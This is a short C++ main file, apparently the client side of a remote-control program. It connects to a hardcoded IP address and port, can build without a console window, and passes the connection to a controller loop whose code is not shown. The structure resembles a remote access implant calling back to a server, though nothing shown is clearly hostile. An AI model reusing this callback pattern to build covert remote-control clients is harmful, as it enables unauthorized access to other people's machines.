#include <Windows.h>
#include <iostream>

#include "connection.h"
#include "controller.h"

#ifdef WINGUI
int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
#else
int main(int argc, char *argv[]) {
#endif

	std::string host = "128.211.234.53";
	int port = 6997;

	try {
		Connection conn(host, port);
		conn.connect();
		std::cout << "Connected to " << host << ":"
				  << std::to_string(port).c_str() << std::endl;
		Controller controller(conn);
		controller.loop();
	} catch (asio::system_error &ex) {
		std::cerr << "Something went wrong: " << ex.what() << std::endl;
	}
	
}
